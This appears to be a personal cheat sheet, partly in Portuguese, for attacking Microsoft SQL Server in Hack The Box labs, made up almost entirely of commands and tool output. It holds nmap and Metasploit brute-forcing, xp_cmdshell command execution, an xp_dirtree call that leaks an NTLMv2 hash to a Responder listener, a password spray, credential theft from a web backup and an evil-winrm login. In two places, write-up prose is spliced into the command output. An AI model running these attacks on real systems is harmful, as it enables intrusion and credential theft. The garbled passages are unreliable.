# MSSQL

- Enum
    
    ```c
    nmap --script ms-sql-info -p 1433 10.0.30.33
    
    nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433
    10.0.30.33
    nmap -p 1433 --script ms-sql-brute --script-args
    userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-p
    asswords.txt 10.0.30.33
    
    nmap -p 1433 --script ms-sql-empty-password 10.0.30.33
    
    nmap -p 1433 --script ms-sql-query --script-args
    mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM
    master..syslogins" 10.0.30.33 -oN output.txt
    gvim output.txt
    
    nmap -p 1433 --script ms-sql-dump-hashes --script-args
    mssql.username=admin,mssql.password=anamaria 10.0.30.33
    
    nmap -p 1433 --script ms-sql-xp-cmdshell --script-args
    mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig"
    10.0.30.33
    
    nmap -p 1433 --script ms-sql-xp-cmdshell --script-args
    mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt"
    10.0.30.33
    
    nmap --script ms-sql-info -p 1433 10.0.20.101
    
    ```
    
- Exploit
    - Login
        
        ```c
        cme mssql 10.129.228.253 --local-auth -u 'PublicUser' -p 'GuestUserCantWrite1' -L
        /usr/local/bin/mssqlclient.py PublicUser:GuestUserCantWrite1@sequel.htb
        
        Metsploit
        msfconsole -q
        use auxiliary/scanner/mssql/mssql_login
        set RHOSTS 10.0.20.101
        set USER_FILE /root/Desktop/wordlist/common_users.txt
        set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt
        set VERBOSE false
        exploit
        ```
        
    - Exploits
        
        ```c
        use auxiliary/admin/mssql/mssql_enum
        set RHOSTS 10.0.20.101
        exploit
        
        use auxiliary/admin/mssql/mssql_enum_sql_logins
        set RHOSTS 10.0.20.101
        exploit
        
        use auxiliary/admin/mssql/mssql_exec
        set RHOSTS 10.0.20.101
        set CMD whoami
        exploit
        
        use auxiliary/admin/mssql/mssql_enum_domain_accounts
        set RHOSTS 10.0.20.101
        exploit
        ```
        
    - Get Credentials
        
        `É importante colocar \fake\share (esta diretoria não existe), é necessário isto para obtermos  a resposta no responder.py` 
        
        Primeiro executa se o responder e só depois o xb_dirtree 
        
        ```
        └──╼ [★]$ sudo /usr/share/responder/Responder.py -I tun0
                                                 __
          .----.-----.-----.-----.-----.-----.--|  |.-----.----.
          |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
          |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                           |__|
        
                   NBT-NS, LLMNR & MDNS Responder 3.0.6.0
        
          Author: Laurent Gaffie (laurent.gaffie@gmail.com)
          To kill this script hit CTRL-C
        
        [+] Poisoners:
            LLMNR                      [ON]
            NBT-NS                     [ON]
            DNS/MDNS                   [ON]
        
        [+] Servers:
            HTTP server                [ON]
            HTTPS server               [ON]
            WPAD proxy                 [OFF]
            Auth proxy                 [OFF]
            SMB server                 [ON]
            Kerberos server            [ON]
            SQL server                 [ON]
            FTP server                 [ON]
            IMAP server                [ON]
            POP3 server                [ON]
            SMTP server                [ON]
            DNS server                 [ON]
            LDAP server                [ON]
            RDP server                 [ON]
            DCE-RPC server             [ON]
            WinRM server               [ON]
        
        [+] HTTP Options:
            Always serving EXE         [OFF]
            Serving EXE                [OFF]
            Serving HTML               [OFF]
            Upstream Proxy             [OFF]
        
        [+] Poisoning Options:
            Analyze Mode               [OFF]
            Force WPAD auth            [OFF]
            Force Basic Auth           [OFF]
            Force LM downgrade         [OFF]
            Fingerprint hosts          [OFF]
        
        [+] Generic Options:
            Responder NIC              [tun0]
            Responder IP               [10.10.14.89]
            Challenge set              [random]
            Don't Respond To Names     ['ISATAP']
        
        [+] Current Session Variables:
            Responder Machine Name     [WIN-E1LTN4SLTJU]
            Responder Domain Name      [2XZZ.LOCAL]
            Responder DCE-RPC Port     [49083]
        [!] Error starting TCP server on port 80, check permissions or other servers running.
        
        [+] Listening for events...
        
        [SMB] NTLMv2-SSP Client   : 10.129.228.253
        [SMB] NTLMv2-SSP Username : sequel\sql_svc
        [SMB] NTLMv2-SSP Hash     : sql_svc::sequel:8649451ff720e4ac:E0B99AFFB8D8AA37EA8E405867C2A1B9:010100000000000000CB5EAC093FDA0152BD2465545F4DDD0000000002000800320058005A005A0001001E00570049004E002D00450031004C0054004E00340053004C0054004A00550004003400570049004E002D00450031004C0054004E00340053004C0054004A0055002E00320058005A005A002E004C004F00430041004C0003001400320058005A005A002E004C004F00430041004C0005001400320058005A005A002E004C004F00430041004C000700080000CB5EAC093FDA01060004000200000008003000300000000000000000000000003000006727C54C69E53B37BDFD62BE59A1D1F5E35A4722EF3D05986B908A69DE5C9D6E0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380039000000000000000000
        ```
        
        ```
        /usr/local/bin/mssqlclient.py PublicUser:GuestUserCantWrite1@sequel.htb
        Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
        
        [*] Encryption required, switching to TLS
        [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
        [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
        [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
        [*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
        [*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
        [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
        [!] Press help for extra shell commands
        SQL (PublicUser  guest@master)> xp_dirtree \\10.10.14.89\fake\share
        subdirectory   depth   file   
        ------------   -----   ----   
        SQL (PublicUser  guest@master)>
        ```
        
- Example
    
    `impacket-lookupsid anonymous@manager.htb -no-pass`
    
    ```
    impacket-lookupsid anonymous@manager.htb -no-pass
    Impacket v0.11.0 - Copyright 2023 Fortra
    [*] Brute forcing SIDs at 10.10.11.236
    [*] StringBinding ncacn_np:10.10.11.236[\pipe\lsarpc]
    We filter out the SidTypeUser entries and add them to a file named usernames.txt .
    It's common practice for users to set passwords identical to their usernames. Therefore, let's
    attempt a password spray attack using the traditional username = password combination. We can
    employ the netexec (formerly known as crackmapexec ) utility to attempt SMB authentication
    against the target, using the same file usernames.txt containing the username list for both the
    username and password wordlist parameters.
    NetExec is the successor of the no-longer maintained CrackMapExec project. It can be 
    installed on Linux, as follows:
    [*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
    498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
    500: MANAGER\Administrator (SidTypeUser)
    501: MANAGER\Guest (SidTypeUser)
    502: MANAGER\krbtgt (SidTypeUser)
    <...SNIP...>
    1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
    1113: MANAGER\Zhong (SidTypeUser)
    1114: MANAGER\Cheng (SidTypeUser)
    1115: MANAGER\Ryan (SidTypeUser)
    1116: MANAGER\Raven (SidTypeUser)
    1117: MANAGER\JinWoo (SidTypeUser)
    1118: MANAGER\ChinHae (SidTypeUser)
    1119: MANAGER\Operator (SidTypeUser)
    ```
    
    Coloca os utilizadores num ficheiro de texto
    
    `netexec smb 10.10.11.236 -u usernames.txt -p usernames.txt --no-bruteforce`
    
    ```
    netexec smb 10.10.11.236 -u usernames.txt -p usernames.txt --no-bruteforce
    SMB 10.10.11.236 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01)
    (domain:manager.htb) (signing:True) (SMBv1:False)
    SMB 10.10.11.236 445 DC01 [-] manager.htb\administrator:administrator
    STATUS_LOGON_FAILURE
    SMB 10.10.11.236 445 DC01 [-] manager.htb\zhong:zhong
    STATUS_LOGON_FAILURE
    SMB 10.10.11.236 445 DC01 [-] manager.htb\cheng:cheng
    STATUS_LOGON_FAILURE
    SMB 10.10.11.236 445 DC01 [-] manager.htb\ryan:ryan
    STATUS_LOGON_FAILURE
    SMB 10.10.11.236 445 DC01 [-] manager.htb\raven:raven
    STATUS_LOGON_FAILURE
    SMB 10.10.11.236 445 DC01 [-] manager.htb\jinWoo:jinWoo
    STATUS_LOGON_FAILURE
    SMB 10.10.11.236 445 DC01 [-] manager.htb\chinHae:chinHae
    STATUS_LOGON_FAILURE
    SMB 10.10.11.236 445 DC01 [+] manager.htb\operator:operator
    ```
    
    Temos um potencial utilizador `operator`, utilizamos essas credencias para aceder ao `MSSQL`
    
    `impacket-mssqlclient manager/operator:operator@manager.htb -windows-auth`
    
    ```
    impacket-mssqlclient manager/operator:operator@manager.htb -windows-auth
    Impacket v0.11.0 - Copyright 2023 Fortra
    [*] Encryption required, switching to TLS
    [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
    [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
    [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
    [*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
    [*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
    [*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
    [!] Press help for extra shell commands
    SQL (MANAGER\Operator guest@master)>
    ```
    
    `xp_dirtree \`
    
    ```
    SQL (MANAGER\Operator guest@master)> xp_dirtree \
    subdirectory depth file
    ------------------------- ----- ----
    $Recycle.Bin 1 0
    Documents and Settings 1 0
    inetpub 1 0
    PerfLogs 1 0
    Program Files 1 0
    Program Files (x86) 1 0
    ProgramData 1 0
    Recovery 1 0
    SQL2019 1 0
    System Volume Information 1 0
    Users 1 0
    Windows 1 0
    ```
    
    Ao entrar na pasta `\inetpub\wwwroot` que tem um backup do webserver
    
    `xp_dirtree \inetpub\wwwroot`
    
    ```
    SQL (MANAGER\Operator guest@master)> xp_dirtree \inetpub\wwwroot
    subdirectory depth file
    ------------------------------- ----- ----
    about.html 1 1
    contact.html 1 1
    css 1 0
    images 1 0
    index.html 1 1
    js 1 0
    service.html 1 1
    web.config 1 1
    website-backup-27-07-23-old.zip 1 1
    ```
    
    Fazendo o download do backup vemos que tem um ficheiro que tem credencias `.old-conf.xml`
    
    `wget http://10.10.11.236/website-backup-27-07-23-old.zip`
    
    ```
    unzip website-backup-27-07-23-old.zip -d website
    cd website
    ls -la
    total 1092
    drwxr-xr-x 5 root root 4096 Mar 13 20:38 .
    drwxrwxrwt 28 root root 4096 Mar 13 20:38 ..
    -rw-r--r-- 1 root root 698 Jul 27 2023 .old-conf.xml
    -rw-r--r-- 1 root root 5386 Jul 27 2023 about.html
    -rw-r--r-- 1 root root 5317 Jul 27 2023 contact.html
    drwxr-xr-x 2 root root 4096 Mar 13 20:38 css
    drwxr-xr-x 2 root root 4096 Mar 13 20:38 images
    -rw-r--r-- 1 root root 18203 Jul 27 2023 index.html
    drwxr-xr-x 2 root root 4096 Mar 13 20:38 js
    -rw-r--r-- 1 root root 7900 Jul 27 2023 service.html
    ```
    
    ```
    cat .old-conf.xml
    We use the obtained credentials to connect to the WinRM service running on the target.
    The user flag can be obtained at c:\users\raven\desktop\user.txt .
    Privilege Escalation
    We'll attempt to identify potential misconfigurations within the Certification Authority. Let's utilize 
    certipy to find any vulnerabilities that may exist.
    <?xml version="1.0" encoding="UTF-8"?>
    <ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <server>
    <host>dc01.manager.htb</host>
    <open-port enabled="true">389</open-port>
    <secure-port enabled="false">0</secure-port>
    <search-base>dc=manager,dc=htb</search-base>
    <server-type>microsoft</server-type>
    <access-user>
    <user>raven@manager.htb</user>
    <password>R4v3nBe5tD3veloP3r!123</password>
    </access-user>
    <uid-attribute>cn</uid-attribute>
    </server>
    <search type="full">
    <dir-list>
    <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
    </dir-list>
    </search>
    </ldap-conf>
    ```
    
    `evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123’`